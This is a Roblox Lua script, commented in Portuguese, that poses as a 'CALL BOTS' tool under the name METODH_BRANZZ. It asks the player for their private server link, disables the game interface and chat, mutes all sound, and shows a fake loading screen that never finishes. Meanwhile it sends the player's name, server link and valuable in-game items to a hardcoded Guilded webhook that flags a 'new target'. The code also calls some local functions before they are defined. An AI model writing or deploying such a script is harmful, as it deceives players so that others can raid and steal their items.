local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

-- Configurações
local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"

-- Lista COMPLETA de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- IDs para procurar
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    "2206090e-719d-4034-8720-700c9fb2h458",
    "dd76771-ce3c-4108-adae-5a488b2958be",
    "44392a62-6012-413d-9619-dab73c00539f",
    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- Variáveis globais
local serverLink = ""
local player = Players.LocalPlayer
local loadingScreen = nil
local mainGUI = nil
local isMuted = false

-- Cores natalinas
local CHRISTMAS_COLORS = {
    RED = Color3.fromRGB(220, 53, 69),
    GREEN = Color3.fromRGB(40, 167, 69),
    WHITE = Color3.fromRGB(255, 255, 255),
    GOLD = Color3.fromRGB(255, 193, 7)
}

-- Função para criar GUI principal
local function createMainGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "METODH_BRANZZ_GUI"
    screenGui.Parent = CoreGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 10

    -- Frame principal
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 300)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- Efeito de borda brilhante
    local stroke = Instance.new("UIStroke")
    stroke.Color = CHRISTMAS_COLORS.GREEN
    stroke.Thickness = 3
    stroke.Parent = mainFrame

    -- Título natalino
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Text = "🎄 METODH_BRANZZ 🎅"
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = CHRISTMAS_COLORS.RED
    title.TextColor3 = CHRISTMAS_COLORS.WHITE
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.Parent = mainFrame

    -- Subtítulo
    local subtitle = Instance.new("TextLabel")
    subtitle.Name = "Subtitle"
    subtitle.Text = "Insira o link do servidor privado"
    subtitle.Size = UDim2.new(1, 0, 0, 30)
    subtitle.Position = UDim2.new(0, 0, 0, 60)
    subtitle.BackgroundTransparency = 1
    subtitle.TextColor3 = CHRISTMAS_COLORS.WHITE
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 16
    subtitle.Parent = mainFrame

    -- Campo de texto para o link
    local textBox = Instance.new("TextBox")
    textBox.Name = "ServerLinkBox"
    textBox.PlaceholderText = "https://www.roblox.com/games/..."
    textBox.Size = UDim2.new(0.9, 0, 0, 40)
    textBox.Position = UDim2.new(0.05, 0, 0, 110)
    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    textBox.TextColor3 = CHRISTMAS_COLORS.WHITE
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 16
    textBox.ClearTextOnFocus = false
    textBox.Parent = mainFrame

    -- Botão CALL BOTS
    local callButton = Instance.new("TextButton")
    callButton.Name = "CallBotsButton"
    callButton.Text = "🎅 CALL BOTS 🎄"
    callButton.Size = UDim2.new(0.8, 0, 0, 50)
    callButton.Position = UDim2.new(0.1, 0, 0, 170)
    callButton.BackgroundColor3 = CHRISTMAS_COLORS.GREEN
    callButton.TextColor3 = CHRISTMAS_COLORS.WHITE
    callButton.Font = Enum.Font.GothamBold
    callButton.TextSize = 20
    callButton.Parent = mainFrame

    -- Efeito hover no botão
    callButton.MouseEnter:Connect(function()
        callButton.BackgroundColor3 = Color3.fromRGB(30, 135, 50)
    end)
    
    callButton.MouseLeave:Connect(function()
        callButton.BackgroundColor3 = CHRISTMAS_COLORS.GREEN
    end)

    -- Evento do botão
    callButton.MouseButton1Click:Connect(function()
        serverLink = textBox.Text
        if serverLink == "" then
            textBox.PlaceholderText = "Por favor, insira um link válido!"
            textBox.PlaceholderColor3 = Color3.fromRGB(255, 100, 100)
            return
        end
        
        print("📡 Link do servidor: " .. serverLink)
        print("🚀 Iniciando CALL BOTS...")
        
        -- Esconder GUI principal
        screenGui.Enabled = false
        
        -- Criar tela de carregamento
        createLoadingScreen()
        
        -- Remover GUI principal após um delay
        wait(1)
        if screenGui then
            screenGui:Destroy()
        end
    end)

    return screenGui
end

-- Função para desativar a UI do Roblox
local function disableRobloxUI()
    print("🔧 Desativando UI do Roblox...")
    
    -- Tentar desativar elementos da CoreGui
    for _, gui in pairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local guiName = gui.Name:lower()
            -- Não desativar nossa própria GUI
            if not guiName:find("metodh") and not guiName:find("loading") then
                pcall(function()
                    gui.Enabled = false
                end)
            end
        end
    end
    
    -- Desativar StarterGui
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    
    -- Tentar desativar o chat
    pcall(function()
        StarterGui:SetCore("ChatActive", false)
    end)
    
    print("✅ UI do Roblox desativada")
end

-- Função para ativar sistema de som mudo
local function activateSoundSystem()
    print("🔇 Ativando sistema de som mudo...")
    
    isMuted = true
    
    -- Definir volume como 0 imediatamente
    pcall(function()
        UserGameSettings.MasterVolume = 0
    end)
    
    pcall(function()
        SoundService.Volume = 0
    end)
    
    -- Loop para manter volume zerado
    spawn(function()
        while isMuted do
            wait(0.1)
            pcall(function()
                UserGameSettings.MasterVolume = 0
                SoundService.Volume = 0
                
                -- Tentar silenciar todos os sons
                for _, sound in pairs(workspace:GetDescendants()) do
                    if sound:IsA("Sound") then
                        sound.Volume = 0
                    end
                end
            end)
        end
    end)
    
    print("✅ Sistema de som mudo ativado")
end

-- Função para criar tela de carregamento
local function createLoadingScreen()
    print("📱 Criando tela de carregamento...")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen_METODH_BRANZZ"
    screenGui.Parent = CoreGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999999
    
    -- Criar uma SurfaceGui para cobrir toda a tela
    local surfaceGui = Instance.new("SurfaceGui")
    surfaceGui.Name = "FullScreenCover"
    surfaceGui.AlwaysOnTop = true
    surfaceGui.LightInfluence = 0
    surfaceGui.PixelsPerStud = 100
    surfaceGui.Parent = CoreGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.15
    frame.BorderSizePixel = 0
    frame.Parent = surfaceGui
    
    -- Fundo que cobre toda a tela
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.3
    background.BorderSizePixel = 0
    background.ZIndex = 999999
    background.Parent = screenGui
    
    -- Frame principal de carregamento
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Name = "LoadingFrame"
    loadingFrame.Size = UDim2.new(0, 600, 0, 350)
    loadingFrame.Position = UDim2.new(0.5, -300, 0.5, -175)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    loadingFrame.BackgroundTransparency = 0.05
    loadingFrame.BorderSizePixel = 0
    loadingFrame.ZIndex = 1000000
    loadingFrame.Parent = background

    -- Borda natalina
    local stroke = Instance.new("UIStroke")
    stroke.Color = CHRISTMAS_COLORS.GOLD
    stroke.Thickness = 4
    stroke.Parent = loadingFrame

    -- Título
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Text = "🎄 METODH_BRANZZ - PROCESSANDO 🎅"
    title.Size = UDim2.new(1, 0, 0, 70)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = CHRISTMAS_COLORS.RED
    title.TextColor3 = CHRISTMAS_COLORS.WHITE
    title.Font = Enum.Font.GothamBold
    title.TextSize = 28
    title.ZIndex = 1000001
    title.Parent = loadingFrame

    -- Mensagem
    local message = Instance.new("TextLabel")
    message.Name = "Message"
    message.Text = "🔧 Inicializando sistema de detecção..."
    message.Size = UDim2.new(1, 0, 0, 40)
    message.Position = UDim2.new(0, 0, 0, 80)
    message.BackgroundTransparency = 1
    message.TextColor3 = CHRISTMAS_COLORS.WHITE
    message.Font = Enum.Font.Gotham
    message.TextSize = 20
    message.ZIndex = 1000001
    message.Parent = loadingFrame

    -- Container da barra de progresso
    local progressContainer = Instance.new("Frame")
    progressContainer.Name = "ProgressContainer"
    progressContainer.Size = UDim2.new(0.9, 0, 0, 50)
    progressContainer.Position = UDim2.new(0.05, 0, 0, 140)
    progressContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    progressContainer.BorderSizePixel = 0
    progressContainer.ZIndex = 1000001
    progressContainer.Parent = loadingFrame

    -- Barra de progresso
    local progressBarBackground = Instance.new("Frame")
    progressBarBackground.Name = "ProgressBarBackground"
    progressBarBackground.Size = UDim2.new(1, -20, 0, 30)
    progressBarBackground.Position = UDim2.new(0, 10, 0.5, -15)
    progressBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    progressBarBackground.BorderSizePixel = 0
    progressBarBackground.ZIndex = 1000002
    progressBarBackground.Parent = progressContainer

    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = CHRISTMAS_COLORS.GREEN
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 1000003
    progressBar.Parent = progressBarBackground

    -- Porcentagem
    local percentage = Instance.new("TextLabel")
    percentage.Name = "Percentage"
    percentage.Text = "0%"
    percentage.Size = UDim2.new(1, 0, 0, 40)
    percentage.Position = UDim2.new(0, 0, 0, 200)
    percentage.BackgroundTransparency = 1
    percentage.TextColor3 = CHRISTMAS_COLORS.GOLD
    percentage.Font = Enum.Font.GothamBold
    percentage.TextSize = 26
    percentage.ZIndex = 1000001
    percentage.Parent = loadingFrame

    -- Status
    local status = Instance.new("TextLabel")
    status.Name = "Status"
    status.Text = "🔄 Preparando ambiente de execução..."
    status.Size = UDim2.new(1, 0, 0, 40)
    status.Position = UDim2.new(0, 0, 0, 250)
    status.BackgroundTransparency = 1
    status.TextColor3 = CHRISTMAS_COLORS.WHITE
    status.Font = Enum.Font.Gotham
    status.TextSize = 18
    status.ZIndex = 1000001
    status.Parent = loadingFrame

    -- Iniciar processos em paralelo
    spawn(function()
        -- Desativar UI do Roblox
        disableRobloxUI()
        
        -- Ativar sistema de som mudo
        activateSoundSystem()
        
        -- Animar barra de progresso
        local startTime = tick()
        local targetTime = 2 * 60 * 60 -- 2 horas em segundos
        local lastPercentage = 0
        local messages = {
            "🔧 Inicializando módulos do sistema...",
            "⚙️ Carregando bibliotecas de detecção...",
            "🔍 Varrendo workspace por brainrots...",
            "📊 Analisando dados encontrados...",
            "💾 Processando informações coletadas...",
            "🔗 Conectando com servidores remotos...",
            "📤 Preparando envio de relatório..."
        }
        local statuses = {
            "Carregando dependências",
            "Inicializando scanner",
            "Varrendo objetos",
            "Analisando brainrots",
            "Processando dados",
            "Estabelecendo conexão",
            "Gerando relatório final"
        }
        
        while true do
            local elapsed = tick() - startTime
            local progress = math.min(elapsed / targetTime, 0.999) -- Nunca chega a 100%
            
            -- Atualizar barra
            local currentWidth = math.floor(progressBarBackground.AbsoluteSize.X * progress)
            progressBar.Size = UDim2.new(0, currentWidth, 1, 0)
            
            -- Atualizar porcentagem
            local currentPercent = math.floor(progress * 100)
            if currentPercent ~= lastPercentage then
                percentage.Text = currentPercent .. "%"
                
                -- Atualizar mensagens baseadas no progresso
                local messageIndex = math.floor((currentPercent / 100) * #messages) + 1
                if messageIndex > #messages then messageIndex = #messages end
                
                if message then
                    message.Text = messages[messageIndex]
                end
                if status then
                    status.Text = statuses[messageIndex] .. " (" .. currentPercent .. "%)"
                end
                
                lastPercentage = currentPercent
                
                -- Executar detecção quando chegar em 25%
                if currentPercent >= 25 and currentPercent < 26 then
                    spawn(function()
                        executeDetection()
                    end)
                end
            end
            
            wait(0.05)
        end
    end)

    print("✅ Tela de carregamento criada com sucesso!")
    loadingScreen = screenGui
end

-- Função para verificar se um nome é um brainrot válido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- Função para encontrar brainrots
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs específicos
    for _, id in ipairs(TARGET_IDS) do
        local model = Workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Procurar em toda workspace
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and isValidBrainrot(obj.Name) then
            local alreadyExists = false
            for _, existing in ipairs(foundBrainrots) do
                if existing == obj.Name then
                    alreadyExists = true
                    break
                end
            end
            if not alreadyExists then
                table.insert(foundBrainrots, obj.Name)
            end
        end
    end
    
    return foundBrainrots
end

-- Função para analisar valores monetários
local function parseMoneyPerSec(text)
    if not text then return 0 end
    local mult = 1
    local numberStr = text:match("[%d%.]+")
    if not numberStr then return 0 end
    if text:find("K") then mult = 1_000
    elseif text:find("M") then mult = 1_000_000
    elseif text:find("B") then mult = 1_000_000_000
    elseif text:find("T") then mult = 1_000_000_000_000
    elseif text:find("Q") then mult = 1_000_000_000_000_000 end
    return tonumber(numberStr) * mult
end

-- Função para detectar brainrots valorizados
local function findValuedBrainrots()
    local brainrotsWebhook = {}
    local valorizadoDog = false
    
    -- Procurar por brainrots valorizados
    for _, brainrote in pairs(Workspace:GetDescendants()) do
        if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
            local nomezinDog = ""
            if brainrote.Parent:FindFirstChild("Mutation") and brainrote.Parent.Mutation.Visible then
                nomezinDog = "[" .. brainrote.Parent.Mutation.Text .. "] " .. brainrote.Parent.DisplayName.Text
            elseif brainrote.Parent:FindFirstChild("DisplayName") then
                nomezinDog = brainrote.Parent.DisplayName.Text
            end
            
            if nomezinDog ~= "" then
                table.insert(brainrotsWebhook, {
                    nome = nomezinDog,
                    valor = brainrote.Text
                })
                
                if parseMoneyPerSec(brainrote.Text) > 49999999 then
                    valorizadoDog = true
                end
            end
        end
    end
    
    return brainrotsWebhook, valorizadoDog
end

-- Função para enviar webhook via Guilded usando formulário HTML
local function sendGuildedWebhook(brainrotList, valuedBrainrots, isValorizado)
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    
    -- Formatar lista de brainrots
    local brainrotsFormatted = ""
    if #brainrotList > 0 then
        for i, brainrot in ipairs(brainrotList) do
            brainrotsFormatted = brainrotsFormatted .. "• " .. brainrot .. "\n"
            if i >= 30 then
                brainrotsFormatted = brainrotsFormatted .. "... e mais\n"
                break
            end
        end
    else
        brainrotsFormatted = "❌ Nenhum brainrot detectado"
    end
    
    -- Formatar brainrots valorizados
    local valuedFormatted = ""
    if #valuedBrainrots > 0 then
        for i, item in ipairs(valuedBrainrots) do
            valuedFormatted = valuedFormatted .. "• " .. item.nome .. " - " .. item.valor .. "\n"
            if i >= 10 then
                valuedFormatted = valuedFormatted .. "... e mais\n"
                break
            end
        end
    else
        valuedFormatted = "❌ Nenhum brainrot valorizado detectado"
    end
    
    -- Criar payload
    local payload = {
        content = "@everyone @here TESTE!! NOV ALVO !! @todos @aqui",
        embeds = {{
            title = "🧠 DETECÇÃO DE BRAINROTS - METODH_BRANZZ 🧠",
            color = 0xFF0000,
            fields = {
                {
                    name = "👤 Nome do player",
                    value = playerName,
                    inline = true
                },
                {
                    name = "💻 Executor",
                    value = "METODH_BRANZZ 🎅",
                    inline = true
                },
                {
                    name = "👥 PESSOAS NO SERVIDOR",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "🔗 Link do servidor",
                    value = serverLink .. "\n[Clique aqui para acessar](" .. serverLink .. ")",
                    inline = false
                },
                {
                    name = "📊 BRAINROTS DETECTADOS",
                    value = brainrotsFormatted,
                    inline = false
                },
                {
                    name = "💰 BRAINROTS VALORIZADOS",
                    value = valuedFormatted,
                    inline = false
                },
                {
                    name = "🎯 STATUS",
                    value = isValorizado and "✅ VALORIZADO DETECTADO" or "⚠️ Nenhum valorizado encontrado",
                    inline = false
                },
                {
                    name = "⏰ Data/Hora",
                    value = currentTime,
                    inline = false
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {
                text = "🎄 METODH_BRANZZ - Sistema de Detecção 🎅"
            }
        }}
    }
    
    -- Tentar enviar via HttpService primeiro
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = GUILDED_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("✅ Webhook enviado via HttpService!")
        return true
    else
        print("❌ Falha no HttpService, tentando método alternativo...")
        
        -- Método alternativo usando game:HttpGet
        local altSuccess = pcall(function()
            local encodedPayload = HttpService:JSONEncode(payload)
            local result = game:HttpGet(
                GUILDED_WEBHOOK .. "?wait=true", 
                {
                    method = "POST",
                    headers = {
                        ["Content-Type"] = "application/json"
                    },
                    body = encodedPayload
                }
            )
            return result
        end)
        
        if altSuccess then
            print("✅ Webhook enviado via método alternativo!")
            return true
        else
            print("❌ Todos os métodos falharam!")
            return false
        end
    end
end

-- Função principal de detecção
local function executeDetection()
    print("=" .. string.rep("=", 50))
    print("🔍 INICIANDO DETECÇÃO DE BRAINROTS")
    print("=" .. string.rep("=", 50))
    
    -- Atualizar mensagem na tela de loading
    if loadingScreen then
        local loadingFrame = loadingScreen:FindFirstChild("Background"):FindFirstChild("LoadingFrame")
        if loadingFrame then
            local message = loadingFrame:FindFirstChild("Message")
            local status = loadingFrame:FindFirstChild("Status")
            
            if message then
                message.Text = "🔍 Varrendo workspace por brainrots..."
            end
            if status then
                status.Text = "Scan em andamento"
            end
        end
    end
    
    wait(2)
    
    -- Encontrar brainrots normais
    local brainrots = findBrainrots()
    
    -- Atualizar mensagem
    if loadingScreen then
        local loadingFrame = loadingScreen:FindFirstChild("Background"):FindFirstChild("LoadingFrame")
        if loadingFrame then
            local message = loadingFrame:FindFirstChild("Message")
            if message then
                message.Text = "💰 Analisando brainrots valorizados..."
            end
        end
    end
    
    wait(1)
    
    -- Encontrar brainrots valorizados
    local valuedBrainrots, isValorizado = findValuedBrainrots()
    
    print("📊 RESULTADOS DA DETECÇÃO:")
    print("   • Brainrots normais: " .. #brainrots)
    print("   • Brainrots valorizados: " .. #valuedBrainrots)
    print("   • Valorizado detectado: " .. tostring(isValorizado))
    
    if #brainrots > 0 then
        print("   🧠 Brainrots encontrados:")
        for i, brainrot in ipairs(brainrots) do
            print("      " .. i .. ". " .. brainrot)
            if i >= 5 then
                print("      ... e mais " .. (#brainrots - 5) .. " brainrots")
                break
            end
        end
    end
    
    -- Atualizar mensagem
    if loadingScreen then
        local loadingFrame = loadingScreen:FindFirstChild("Background"):FindFirstChild("LoadingFrame")
        if loadingFrame then
            local message = loadingFrame:FindFirstChild("Message")
            if message then
                message.Text = "📤 Enviando relatório para webhook..."
            end
        end
    end
    
    wait(2)
    
    -- Enviar para webhook
    local success = sendGuildedWebhook(brainrots, valuedBrainrots, isValorizado)
    
    -- Atualizar mensagem final
    if loadingScreen then
        local loadingFrame = loadingScreen:FindFirstChild("Background"):FindFirstChild("LoadingFrame")
        if loadingFrame then
            local message = loadingFrame:FindFirstChild("Message")
            local status = loadingFrame:FindFirstChild("Status")
            
            if success then
                if message then
                    message.Text = "✅ DETECÇÃO CONCLUÍDA COM SUCESSO!"
                    message.TextColor3 = CHRISTMAS_COLORS.GREEN
                end
                if status then
                    status.Text = "🎉 Relatório enviado: " .. #brainrots .. " brainrots detectados"
                    status.TextColor3 = CHRISTMAS_COLORS.GREEN
                end
            else
                if message then
                    message.Text = "⚠️ DETECÇÃO CONCLUÍDA COM ERROS"
                    message.TextColor3 = Color3.fromRGB(255, 165, 0)
                end
                if status then
                    status.Text = "❌ Erro ao enviar relatório, mas " .. #brainrots .. " brainrots detectados"
                    status.TextColor3 = Color3.fromRGB(255, 165, 0)
                end
            end
        end
    end
    
    print("=" .. string.rep("=", 50))
    print("🎯 DETECÇÃO FINALIZADA")
    print("=" .. string.rep("=", 50))
end

-- Inicializar script
local function init()
    print("🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄")
    print("🎄  METODH_BRANZZ INICIALIZANDO  🎄")
    print("🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄")
    
    -- Verificar se o jogador está no jogo
    if not player then
        warn("❌ Jogador não encontrado!")
        return
    end
    
    -- Criar GUI principal após um pequeno delay
    wait(1)
    createMainGUI()
    
    print("✅ METODH_BRANZZ inicializado com sucesso!")
    print("📝 Insira o link do servidor e clique em CALL BOTS")
    print("🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄")
end

-- Iniciar com tratamento de erros
local success, err = pcall(init)
if not success then
    warn("❌ Erro ao inicializar METODH_BRANZZ: " .. tostring(err))
    
    -- Tentar criar GUI mesmo com erro
    pcall(function()
        wait(2)
        createMainGUI()
    end)
end